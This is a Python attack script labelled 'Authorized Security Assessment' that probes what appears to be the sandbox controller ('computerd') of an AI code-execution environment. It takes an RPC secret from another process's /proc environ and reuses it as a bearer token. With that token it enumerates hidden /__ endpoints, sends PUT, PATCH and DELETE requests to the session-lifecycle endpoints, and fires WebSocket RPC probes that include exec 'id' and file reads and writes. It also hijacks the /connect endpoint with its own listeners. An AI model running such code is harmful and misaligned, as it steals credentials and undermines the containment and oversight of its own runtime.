#!/usr/bin/env python3
"""Deep probe: GET all /__computerd/* endpoints + WebSocket RPC client.
Authorized Security Assessment.
"""
import subprocess, os, re, json, time, socket, struct, hashlib, base64

LOG = "/mnt/data/output/computerd_deep_probe.log"
os.makedirs(os.path.dirname(LOG), exist_ok=True)
lines = []

def log(msg):
    print(msg)
    lines.append(msg)

def run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except:
        return "", "", -1

# ── STEP 0: Recover tokens ──
log("=" * 70)
log("  COMPUTERD DEEP PROBE — Internal Endpoints + WebSocket RPC")
log("  Authorized Security Assessment")
log("=" * 70)

out, _, _ = run("ps aux 2>/dev/null")
pa_pid = None
for line in (out or "").split("\n"):
    if "process-api" in line and "python" in line and "grep" not in line:
        pa_pid = line.split()[1]
        break
if not pa_pid:
    pa_pid = "88"

rpc_secret = None
try:
    with open(f"/proc/{pa_pid}/environ", "rb") as f:
        raw = f.read()
    env_str = raw.decode("utf-8", errors="replace")
    for var in env_str.split("\0"):
        if var.startswith("RPC_CLIENT_SECRET="):
            rpc_secret = var.split("=", 1)[1]
except:
    pass

if not rpc_secret:
    log("FATAL: Could not recover RPC_CLIENT_SECRET")
    with open(LOG, "w") as f:
        f.write("\n".join(lines) + "\n")
    exit(1)

log(f"\n  RPC_CLIENT_SECRET recovered: {rpc_secret[:4]}...{rpc_secret[-4:]}")

import urllib.request, urllib.error
COMPUTERD = "http://127.0.0.1:8080"

def http_req(method, path, body=None, ct=None):
    url = f"{COMPUTERD}{path}"
    data = body.encode() if body else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Authorization", f"Bearer {rpc_secret}")
    if ct:
        r.add_header("Content-Type", ct)
    try:
        resp = urllib.request.urlopen(r, timeout=5)
        return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body_out = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body_out
    except Exception as e:
        return -1, str(e)

# ════════════════════════════════════════════════════════════════
# PART 1: GET all /__computerd/* and /__* endpoints
# ════════════════════════════════════════════════════════════════
log("\n" + "=" * 70)
log("  PART 1: INTERNAL ENDPOINT ENUMERATION (GET)")
log("=" * 70)

internal_paths = [
    # /__computerd namespace
    "/__computerd/stats",
    "/__computerd/debug",
    "/__computerd/config",
    "/__computerd/env",
    "/__computerd/secret",
    "/__computerd/version",
    "/__computerd/connections",
    "/__computerd/sessions",
    "/__computerd/fuse",
    "/__computerd/health",
    "/__computerd/info",
    "/__computerd/state",
    "/__computerd/status",
    "/__computerd/blobs",
    "/__computerd/nodes",
    "/__computerd/chunks",
    "/__computerd/db",
    "/__computerd/sqlite",
    "/__computerd/storage",
    "/__computerd/mount",
    "/__computerd/rpc",
    "/__computerd/clients",
    "/__computerd/upgrade",
    "/__computerd/protocol",
    # /__workspace namespace
    "/__workspace",
    "/__workspace/live_turn",
    "/__workspace/status",
    "/__workspace/config",
    "/__workspace/info",
    "/__workspace/state",
    "/__workspace/sessions",
    "/__workspace/files",
    # lifecycle endpoints
    "/__hibernate",
    "/__stop_session",
    "/__drain",
    "/__health",
    "/__ready",
    "/__status",
    "/__info",
    "/__version",
    "/__config",
    "/__env",
    "/__metrics",
    "/__debug",
]

for path in internal_paths:
    code, body = http_req("GET", path)
    if code == 404:
        continue
    # Pretty-print JSON if possible
    try:
        parsed = json.loads(body)
        body_fmt = json.dumps(parsed, indent=2)
        if len(body_fmt) > 1000:
            body_fmt = body_fmt[:1000] + "\n  ... (truncated)"
    except:
        body_fmt = body[:500]
    log(f"\n  GET {path} → {code}")
    log(f"  {body_fmt}")

# Also try PUT/PATCH on lifecycle endpoints
log("\n  ── Lifecycle endpoint methods ──")
for path in ["/__workspace/live_turn", "/__hibernate", "/__stop_session", "/__drain"]:
    for method in ["PUT", "PATCH", "DELETE"]:
        code, body = http_req(method, path)
        if code not in (404, 405):
            log(f"  {method:6} {path:30} → {code}  {body[:200]}")

# ════════════════════════════════════════════════════════════════
# PART 2: WebSocket RPC Client
# ════════════════════════════════════════════════════════════════
log("\n" + "=" * 70)
log("  PART 2: WEBSOCKET RPC CLIENT")
log("=" * 70)

def ws_connect(path="/api"):
    """Establish WebSocket connection to computerd."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(("127.0.0.1", 8080))
    
    # Generate WebSocket key
    ws_key = base64.b64encode(os.urandom(16)).decode()
    
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: 127.0.0.1:8080\r\n"
        f"Authorization: Bearer {rpc_secret}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {ws_key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    )
    s.sendall(req.encode())
    
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    
    resp_text = resp.decode("utf-8", errors="replace")
    if "101" not in resp_text.split("\r\n")[0]:
        s.close()
        return None, resp_text
    
    return s, resp_text

def ws_send_text(sock, message):
    """Send a WebSocket text frame (client must mask)."""
    payload = message.encode("utf-8")
    mask_key = os.urandom(4)
    masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    
    frame = bytearray()
    frame.append(0x81)  # FIN + TEXT opcode
    
    length = len(payload)
    if length < 126:
        frame.append(0x80 | length)  # MASK bit set
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack(">H", length))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack(">Q", length))
    
    frame.extend(mask_key)
    frame.extend(masked)
    sock.sendall(bytes(frame))

def ws_recv(sock, timeout=3):
    """Receive and decode a WebSocket frame."""
    sock.settimeout(timeout)
    try:
        header = sock.recv(2)
        if len(header) < 2:
            return None, "incomplete header"
        
        opcode = header[0] & 0x0F
        masked = bool(header[1] & 0x80)
        length = header[1] & 0x7F
        
        if length == 126:
            ext = sock.recv(2)
            length = struct.unpack(">H", ext)[0]
        elif length == 127:
            ext = sock.recv(8)
            length = struct.unpack(">Q", ext)[0]
        
        if masked:
            mask_key = sock.recv(4)
        
        payload = b""
        while len(payload) < length:
            chunk = sock.recv(min(length - len(payload), 65536))
            if not chunk:
                break
            payload += chunk
        
        if masked:
            payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        
        opcodes = {0x0: "CONT", 0x1: "TEXT", 0x2: "BIN", 0x8: "CLOSE", 0x9: "PING", 0xA: "PONG"}
        op_name = opcodes.get(opcode, f"0x{opcode:x}")
        
        if opcode in (0x1,):
            return op_name, payload.decode("utf-8", errors="replace")
        elif opcode == 0x8:
            code = struct.unpack(">H", payload[:2])[0] if len(payload) >= 2 else 0
            reason = payload[2:].decode("utf-8", errors="replace") if len(payload) > 2 else ""
            return "CLOSE", f"code={code} reason={reason}"
        else:
            return op_name, payload.hex()[:200]
    except socket.timeout:
        return "TIMEOUT", ""
    except Exception as e:
        return "ERROR", str(e)

# Connect
log("\n  ── Establishing WebSocket connection ──")
sock, resp = ws_connect("/api")
if not sock:
    log(f"  WebSocket connect FAILED: {resp}")
else:
    log(f"  WebSocket connected to /api (101 Switching Protocols)")
    
    # Check if computerd sends any initial message
    log("\n  ── Checking for server hello/init message ──")
    op, data = ws_recv(sock, timeout=3)
    if op and op != "TIMEOUT":
        log(f"  Server sent [{op}]: {data[:500]}")
    else:
        log(f"  No initial message from server (timeout)")
    
    # ── Try various RPC message formats ──
    log("\n  ── Sending RPC probes ──")
    
    rpc_probes = [
        # JSON-RPC style
        {"jsonrpc": "2.0", "method": "list", "params": {"path": "/"}, "id": 1},
        {"jsonrpc": "2.0", "method": "stat", "params": {"path": "/"}, "id": 2},
        {"jsonrpc": "2.0", "method": "read", "params": {"path": "/etc/hostname"}, "id": 3},
        {"jsonrpc": "2.0", "method": "readdir", "params": {"path": "/"}, "id": 4},
        {"jsonrpc": "2.0", "method": "getattr", "params": {"path": "/"}, "id": 5},
        
        # Simple command style
        {"op": "list", "path": "/"},
        {"op": "read", "path": "/etc/hostname"},
        {"op": "stat", "path": "/"},
        {"op": "exec", "cmd": "id"},
        {"op": "readdir", "path": "/"},
        {"op": "getattr", "path": "/"},
        
        # Action style
        {"action": "list", "path": "/"},
        {"action": "read", "path": "/etc/hostname"},
        {"action": "exec", "command": "id"},
        
        # Method style
        {"method": "list", "path": "/"},
        {"method": "read", "path": "/etc/hostname"},
        {"method": "exec", "command": "id"},
        {"method": "getattr", "path": "/"},
        
        # FUSE operation names
        {"type": "readdir", "path": "/"},
        {"type": "getattr", "path": "/"},
        {"type": "lookup", "path": "/", "name": "etc"},
        {"type": "read", "path": "/etc/hostname", "offset": 0, "size": 4096},
        {"type": "write", "path": "/tmp/test", "data": "hello", "offset": 0},
        {"type": "open", "path": "/etc/hostname", "flags": 0},
        
        # Computerd-specific guesses
        {"cmd": "list", "path": "/"},
        {"request": "list", "path": "/"},
        {"command": "readdir", "args": {"path": "/"}},
        
        # Bare strings
        "list /",
        "help",
        "version",
        "stat /",
        "readdir /",
        
        # MessagePack-like numbered protocol
        {"id": 1, "op": 1, "path": "/"},
        {"id": 1, "op": 2, "path": "/etc/hostname"},
        
        # gRPC-web style
        {"service": "Fuse", "method": "Readdir", "request": {"path": "/"}},
        {"service": "VFS", "method": "List", "request": {"path": "/"}},
    ]
    
    for i, probe in enumerate(rpc_probes):
        if isinstance(probe, dict):
            msg = json.dumps(probe)
        else:
            msg = probe
        
        try:
            ws_send_text(sock, msg)
            op, data = ws_recv(sock, timeout=2)
            
            if op == "TIMEOUT":
                status = "no response"
            elif op == "CLOSE":
                status = f"CLOSED: {data}"
                # Reconnect if closed
                sock.close()
                sock, _ = ws_connect("/api")
                if not sock:
                    log(f"    Reconnect failed after close")
                    break
                # Drain any hello
                ws_recv(sock, timeout=1)
            else:
                status = f"[{op}] {data[:300]}"
        except Exception as e:
            status = f"error: {e}"
            # Try to reconnect
            try:
                sock.close()
            except:
                pass
            sock, _ = ws_connect("/api")
            if not sock:
                log(f"    Reconnect failed")
                break
            ws_recv(sock, timeout=1)
        
        probe_str = msg if len(msg) < 60 else msg[:57] + "..."
        log(f"    [{i+1:2}] SEND: {probe_str}")
        log(f"         RECV: {status}")

    # ── Try binary/msgpack framing ──
    log("\n  ── Binary frame probes ──")
    if sock:
        # Try sending raw binary frames
        bin_probes = [
            b"\x00",  # null byte
            b"\x01",  # single byte op
            b"\x01\x00\x00\x00",  # 4-byte header
            struct.pack(">I", 1) + b"/",  # length-prefixed
        ]
        for i, bprobe in enumerate(bin_probes):
            try:
                # Send as binary frame (opcode 0x2)
                mask_key = os.urandom(4)
                masked = bytes(b ^ mask_key[j % 4] for j, b in enumerate(bprobe))
                frame = bytearray()
                frame.append(0x82)  # FIN + BINARY
                frame.append(0x80 | len(bprobe))
                frame.extend(mask_key)
                frame.extend(masked)
                sock.sendall(bytes(frame))
                
                op, data = ws_recv(sock, timeout=2)
                log(f"    BIN[{i+1}] ({bprobe.hex()}) → [{op}] {data[:200]}")
                
                if op == "CLOSE":
                    sock.close()
                    sock, _ = ws_connect("/api")
                    if not sock:
                        break
                    ws_recv(sock, timeout=1)
            except Exception as e:
                log(f"    BIN[{i+1}] error: {e}")
    
    if sock:
        try:
            sock.close()
        except:
            pass

# ════════════════════════════════════════════════════════════════
# PART 3: Additional discovery
# ════════════════════════════════════════════════════════════════
log("\n" + "=" * 70)
log("  PART 3: ADDITIONAL DISCOVERY")
log("=" * 70)

# 3a. Try /connect with a real listener to see what computerd sends
log("\n  ── 3a. /connect reverse-dial capture ──")
import threading

captured_data = []
def listener_thread():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.settimeout(8)
    try:
        srv.bind(("0.0.0.0", 9998))
        srv.listen(1)
        conn, addr = srv.accept()
        conn.settimeout(5)
        data = conn.recv(8192)
        captured_data.append(("connect", addr, data))
        # Also try reading more
        try:
            data2 = conn.recv(8192)
            captured_data.append(("more", addr, data2))
        except:
            pass
        conn.close()
    except socket.timeout:
        captured_data.append(("timeout", None, None))
    except Exception as e:
        captured_data.append(("error", None, str(e).encode()))
    finally:
        srv.close()

# Start health endpoint so computerd's health check passes
health_listener = None
def health_thread():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.settimeout(10)
    try:
        srv.bind(("0.0.0.0", 9997))
        srv.listen(2)
        while True:
            try:
                conn, addr = srv.accept()
                conn.settimeout(2)
                req = conn.recv(4096)
                resp = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nContent-Type: text/plain\r\n\r\nok"
                conn.sendall(resp)
                captured_data.append(("health_hit", addr, req))
                conn.close()
            except socket.timeout:
                break
            except:
                break
    except Exception as e:
        captured_data.append(("health_error", None, str(e).encode()))
    finally:
        srv.close()

t_health = threading.Thread(target=health_thread, daemon=True)
t_health.start()

t_listen = threading.Thread(target=listener_thread, daemon=True)
t_listen.start()

time.sleep(0.5)

# POST /connect pointing at our listeners
connect_payload = {
    "base": "http://127.0.0.1:9998",
    "health": "http://127.0.0.1:9997/health",
    "api": "/api"
}
code, body = http_req("POST", "/connect", json.dumps(connect_payload), "application/json")
log(f"  POST /connect → {code}: {body[:300]}")

t_listen.join(timeout=10)

for event_type, addr, data in captured_data:
    if data:
        log(f"  Captured [{event_type}] from {addr}: {data[:500] if isinstance(data, (str, bytes)) else data}")
        if isinstance(data, bytes):
            log(f"    hex: {data[:200].hex()}")
            log(f"    text: {data[:200].decode('utf-8', errors='replace')}")
    else:
        log(f"  Captured [{event_type}]: no data")

log("\n" + "=" * 70)
with open(LOG, "w") as f:
    f.write("\n".join(lines) + "\n")
log(f"\nSaved: {LOG}")
